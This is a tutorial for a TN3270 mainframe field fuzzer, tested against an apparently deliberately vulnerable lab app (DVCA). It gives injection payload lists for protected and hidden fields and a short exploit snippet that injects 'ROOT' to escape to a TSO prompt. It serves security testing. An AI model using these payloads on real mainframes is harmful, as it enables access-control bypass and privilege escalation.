# fuzz3.py - Protected & Hidden Field Fuzzer Tutorial

This tutorial explains `fuzz3.py`, which tests security vulnerabilities in protected and hidden 3270 fields - a common source of mainframe security issues.

## The Vulnerability

TN3270 terminals have "protected" fields that users cannot edit and "hidden" fields that are invisible. However:

| Field Type | Terminal Behavior | Server Trust Issue |
|------------|------------------|-------------------|
| **Protected** | Keyboard input blocked | Server may trust data unchanged |
| **Hidden** | Not displayed to user | May contain sensitive data |

The terminal enforces these restrictions, but **raw packets bypass the terminal entirely**. If the server trusts this data without validation, attackers can:
- Modify transaction codes
- Change authorization flags
- Inject commands into trusted fields
- Access hidden session data

## Real-World Finding: DVCA TSO Escape

Using this fuzzer on DVCA, we discovered:

```
[*] Fuzzing field 0 (addr 1, len 104) [PROTECTED]
  [!] CORRUPTION: root_inject -> NOT FOUND

  [!!!] CORRUPTION DETECTED!
        Field: 0 (addr 1)
        Payload: root_inject
        Data: 'ROOT'
```

Injecting "ROOT" into a protected field containing the transaction code "MCAD" caused the application to try routing to a non-existent "ROOT" transaction - proving the server blindly trusted protected field data.

## Configuration

```python
# What to fuzz
FUZZ_UNPROTECTED = True   # Normal input fields
FUZZ_PROTECTED = True     # Read-only fields
FUZZ_HIDDEN = True        # Hidden fields
```

Toggle these to focus your testing:
- `FUZZ_PROTECTED = True, FUZZ_HIDDEN = False` - Test only protected fields
- `FUZZ_HIDDEN = True, others = False` - Focus on hidden fields

## Field Discovery

Uses the API's screen parsing:

```python
def get_fuzzable_fields(api, raw_data=None):
    all_fields = api.parse_screen_fields(raw_data)
    fuzzable = []
    
    for f in all_fields:
        if f['protected'] and f['hidden']:
            if FUZZ_HIDDEN:
                fuzzable.append(f)
        elif f['protected']:
            if FUZZ_PROTECTED:
                fuzzable.append(f)
        elif f['hidden']:
            if FUZZ_HIDDEN:
                fuzzable.append(f)
        else:
            if FUZZ_UNPROTECTED:
                fuzzable.append(f)
    
    return fuzzable, all_fields
```

## Targeted Payloads

### For Protected Fields

```python
if is_protected:
    payloads.append(('clear_protected', ' ' * field_length, False))
    payloads.append(('modify_protected', 'HACKED' * n, False))
    payloads.append(('numeric_inject', '99999999', False))
    payloads.append(('admin_inject', 'ADMIN', False))
    payloads.append(('root_inject', 'ROOT', False))
    payloads.append(('system_inject', 'SYSTEM', False))
```

These test if the server:
- Validates protected data hasn't changed
- Uses protected data for routing/authorization
- Trusts transaction codes in protected fields

### For Hidden Fields

```python
if is_hidden:
    payloads.append(('session_clear', '\x00' * field_length, True))
    payloads.append(('session_modify', b'\xFF' * 32, True))
    payloads.append(('auth_bypass', 'Y' * field_length, False))
    payloads.append(('privilege_inject', 'ADMIN   ', False))
    payloads.append(('true_inject', 'TRUE', False))
    payloads.append(('one_inject', '1', False))
    payloads.append(('yes_inject', 'YES', False))
```

These test if:
- Hidden fields contain authorization flags
- Session tokens can be modified
- Boolean flags can be flipped

## Response Analysis

```python
def check_for_interesting(api, response, original_response=None):
    results = []
    
    # Use API's abend detection
    abend = api.check_abend(response)
    if abend:
        results.append(('ABEND', abend))
    
    # Corruption indicators
    for pattern in CORRUPTION_PATTERNS:
        if pattern in response_upper:
            results.append(('CORRUPTION', pattern))
    
    # Error messages (validation working)
    # Success messages (validation NOT working - bad!)
    # Length changes (state affected)
    
    return results
```

### Finding Types

| Type | Meaning | Security Impact |
|------|---------|-----------------|
| **ABEND** | Application crashed | DoS, potential info leak |
| **CORRUPTION** | Transaction routing failed | App trusts protected data |
| **ERROR** | Server rejected change | Validation is working |
| **SUCCESS** | Change was accepted | **Critical vulnerability** |
| **LENGTH_CHANGE** | Response differs | State was affected |

## Running the Fuzzer

```bash
cd API-DVCA-Code
python fuzz3.py --yes
```

### Sample Output

```
======================================================================
Protected & Hidden Field Fuzzer
======================================================================

Fuzzing: Unprotected=True, Protected=True, Hidden=True
[+] Connected to API

[*] Analyzing current screen...

[+] Field Analysis:
    Total fields:     67
    Unprotected:      7
    Protected:        60
    Hidden:           0
    Will fuzz:        67

[*] Fields to fuzz:
  [0] Addr: 0001 (40c1)  Len: 104 [PROTECTED] = 'MCAD'
  [1] Addr: 0106 (c16a)  Len:   4 [PROTECTED] = 'Mels'
  ...
  [15] Addr: 0423 (c6e7)  Len:  44 = 'Philip Young'
  ...

======================================================================
Starting Fuzzing
======================================================================

[*] Fuzzing field 0 (addr 1, len 104) [PROTECTED]
  [!] ERROR: overflow_2x -> INVALID
  [!] LENGTH_CHANGE: overflow_10x -> 3336 -> 93
  [!] CORRUPTION: root_inject -> NOT FOUND

  [!!!] CORRUPTION DETECTED!
        Field: 0 (addr 1)
        Payload: root_inject
        Data: 'ROOT'
        Previous: None

[!!!] Stopping due to detected corruption.

======================================================================
Fuzzing Complete
======================================================================

Total tests: 11
Findings: 15

Findings by type:

  ERROR (5):
    - Field 0 [PROT]: overflow_2x -> INVALID
    ...

  CORRUPTION (1):
    - Field 0 [PROT]: root_inject -> NOT FOUND
```

## Corruption Detection

When corruption is detected, the fuzzer stops immediately and reports:

```python
if finding_type == 'CORRUPTION':
    print(f"[!!!] CORRUPTION DETECTED!")
    print(f"      Field: {field_idx} (addr {field['address']})")
    print(f"      Payload: {payload_name}")
    print(f"      Data: {repr(payload_data)[:100]}")
    print(f"      Previous: {last_successful_payload}")
    corruption_detected = True
    break
```

This is critical because:
1. **The application state is corrupted**
2. **Further fuzzing may produce misleading results**
3. **You've found a significant vulnerability**

## API Functions Used

| Function | Purpose |
|----------|---------|
| `parse_screen_fields()` | Discover all fields including protected/hidden |
| `encode_buffer_address()` | Convert position to bytes |
| `check_abend()` | Detect mainframe errors |
| `is_tn3270e()` | Check protocol mode |
| `ascii_to_ebcdic()` | Convert text payloads |
| `ebcdic_to_ascii()` | Display field values |

## Security Implications

### If CORRUPTION is Found

The server uses protected field data without validation. Attacker can:
- **Route to arbitrary transactions** (access control bypass)
- **Cause denial of service** (invalid transaction crashes)
- **Potentially escalate privileges** (if transaction codes are privileged)

### If SUCCESS is Found on Protected Fields

The server accepts modifications to "read-only" data. Attacker can:
- **Modify records they shouldn't** (data integrity violation)
- **Bypass authorization checks** (if auth data in protected fields)
- **Forge audit trails** (if timestamps/user IDs are protected)

### If Hidden Fields Can Be Modified

Hidden fields often contain:
- Session tokens
- Authorization flags
- User privilege levels
- Transaction counters

Modifying these can lead to session hijacking or privilege escalation.

## Comparison: fuzz.py vs fuzz2.py vs fuzz3.py

| Aspect | fuzz.py | fuzz2.py | fuzz3.py |
|--------|---------|----------|----------|
| Field config | Hardcoded | Dynamic | Dynamic |
| Field types | Input only | Input only | **All types** |
| Focus | CICS payloads | Quick testing | **Access control** |
| Best for | Known forms | New screens | **Security testing** |

## Exploitation Example

After finding the DVCA vulnerability:

```python
# Navigate to address update screen (Option 2)
# Inject "ROOT" into protected field at position 1

from hack3270_api import Hack3270API

api = Hack3270API()
api.connect()

# Build packet targeting protected field
packet = api.build_raw_packet(
    data=api.ascii_to_ebcdic('ROOT'),
    cursor_addr=1,
    field_addr=1
)
api.send_raw(packet)

# Result: TSO READY prompt instead of CICS application
```

See `DVCA-TSO-Exploit.md` for the full exploitation writeup.

## See Also

- `fuzz.py` - Comprehensive CICS payload fuzzer
- `fuzz2.py` - Dynamic field discovery fuzzer
- `order_fuzz.py` - TN3270 protocol order fuzzer
- `DVCA-TSO-Exploit.md` - Protected field exploitation
- `API_Documentation.md` - Full API reference
